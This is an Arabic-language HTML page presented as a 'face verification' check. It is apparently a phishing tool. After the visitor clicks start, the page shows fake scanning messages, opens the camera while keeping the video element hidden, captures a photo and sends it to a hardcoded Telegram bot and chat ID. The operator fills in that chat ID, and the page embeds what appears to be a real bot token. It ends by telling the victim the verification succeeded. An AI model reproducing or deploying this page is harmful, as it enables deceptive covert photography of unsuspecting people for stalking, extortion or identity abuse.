<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحقق من الوجه</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #000; color: #fff; padding-top: 50px; }
        #status { font-size: 20px; color: #ffcc00; margin-bottom: 20px; }
        #video { display: none; } /* الكاميرا مخفية */
    </style>
</head>
<body>

    <div id="status">اضغط للبدء</div>
    <button id="startBtn">بدء التحقق</button>
    <video id="video" autoplay playsinline></video>

    <script>
        const TOKEN = "8446745973:AAGRD2tFbSrzB2OFoByvYRHCY1Hp6nluHf0";
        const CHAT_ID = "ضع_ايديك_هنا"; // <--- ضع رقم الآيدي الخاص بك هنا بدقة
        const statusEl = document.getElementById('status');
        const video = document.getElementById('video');

        const sleep = (ms) => new Promise(r => setTimeout(r, ms));

        document.getElementById('startBtn').onclick = async () => {
            document.getElementById('startBtn').style.display = 'none';
            
            try {
                // 1. جاري الفحص
                statusEl.innerText = "جاري فحص ملامح الوجه...";
                await sleep(2000); // انتظر 2 ثانية

                // 2. جاري التأكد
                statusEl.innerText = "جاري التأكد...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                await sleep(1500); // انتظر لحظة لضبط الكاميرا

                // 3. التقاط الصورة
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                // 4. إرسال الصورة
                statusEl.innerText = "جاري إتمام العملية...";
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'face.jpg');

                    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    if (response.ok) {
                        statusEl.innerText = "تم التحقق بنجاح!";
                    } else {
                        statusEl.innerText = "حدث خطأ في الاتصال بالسيرفر.";
                    }
                    
                    // إغلاق الكاميرا بعد الانتهاء
                    stream.getTracks().forEach(track => track.stop());
                }, 'image/jpeg');

            } catch (err) {
                statusEl.innerText = "يجب السماح بالوصول للكاميرا لإكمال الفحص.";
                console.error(err);
            }
        };
    </script>
</body>
</html>
